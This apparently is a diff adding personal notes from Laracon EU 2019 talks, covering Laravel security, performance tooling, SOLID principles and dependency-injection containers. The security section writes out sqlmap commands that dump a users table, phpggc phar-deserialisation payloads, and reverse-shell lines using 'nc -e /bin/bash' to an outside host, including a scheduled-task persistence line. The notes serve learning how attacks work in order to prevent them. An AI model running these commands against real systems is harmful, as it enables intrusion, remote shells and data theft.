@@ -1,0 +1,107 @@
+####################################################
+
+Laracon EU 2019
+
+####################################################
+
+--------------------------------------------------
+How your Laravel application can get hacked,
+and how to prevent that from happening by Antti Rössi
+https://www.youtube.com/watch?v=kKGGVGiq2y8
+--------------------------------------------------
+
+sql injection
+# http://sqlmap.org/
+sqlmap -u http://example/api/events/?sort\=name --dbms=mysql --batch
+sqlmap -u http://example/api/events/?sort\=name --dbms=mysql --current-db
+sqlmap -u http://example/api/events/?sort\=name --dbms=mysql -D databasename --tables
+sqlmap -u http://example/api/events/?sort\=name --dbms=mysql -D databasename -T users --dump
+
+
+
+object injection
+# distruct method serialize/deserialize
+# filesize()
+# phpggc tool
+phpggc -f guzzle/rce1/passthru "whoami" -pj mo.jpg -o rce.jpg
+http -f POST website:pwn:1234/api/uploads file@rce.jpg
+http GET website:pwn:1234/api/file filename=rce.jpg
+http GET website:pwn:1234/api/file filename=phar://rce.jpg
+phpggc -f guzzle/rce1/passthru "nc docker.for.mac.host 1337 -e /bin/bash" -pj mo.jpg -o reverse.jpg
+nc -vv -l 0.0.0.0:1337
+
+
+/html/app/Console/Kernel.php
+function schedule()
+$schedule->exec('nc docker.host 7331 -e /bin/bash')
+
+
+
+--------------------------------------------------
+Performance optimization: how do I go about it? by Kasia Zien
+https://www.youtube.com/watch?v=hOajLLej68Y
+--------------------------------------------------
+go-wrk, pewpew, jmeter, gatling, apachebench,
+curl-loader, httperf, vegeta
+
+https://blackfire.io/
+
+xdebug, xhprof, php-meminfo, phpspy, cigar,  qcachegrind
+
+/bin/analyser -v ref-path 0x34523p533 /tmp/cigar-memory.json
+flame graph
+
+
+--------------------------------------------------
+SOLID  design principles by Katerina Trajchevska
+https://www.youtube.com/watch?v=rtmFCcjEgEw
+--------------------------------------------------
+Factory patterns
+Interface Segregation Principle
+Dependency Inversion Principle
+
+--------------------------------------------------
+SOLID in architecture by Michal Ksionek
+https://www.youtube.com/watch?v=JNvX1Pge9CY
+--------------------------------------------------
+Single Responsibility Principle SRP
+Open Close Principle OCP
+Liskov Substitution Principle
+Interface Segregation Principle ISP
+Dependency Inversion Principle
+CRP REP CCP OCP
+Acyclic Dependency Principle
+Stable Dependencies Principle
+Stable Abstraction Principle
+--------------------------------------------------
+Have your cake and eat it too with Inertia.js by Sebastian De Deyne
+https://www.youtube.com/watch?v=8to7QtuD3is
+--------------------------------------------------
+
+Demystifying Dependency Injection Containers by Kai Sassnowski
+https://www.youtube.com/watch?v=y7EbrV4ChJs
+
+
+class Container  {
+	private $bindings = [];
+	public function set($abstract, callable $factory){
+		this->bindings[$abstract] = $factory;
+	}
+	public function get($abstract){
+		return this->bindings[$abstract]($this);
+	}
+}
+
+User(Session(Logger()));
+
+public function get($abstract){
+	$reflection = new ReflectionClass($abstract);
+}
+
+private function buildDependencies($reflection){
+	if(!$constructor = $reflection->getConstructor()){
+		return [];
+	}
+	$params = $constructor->getParameters();
+}
+
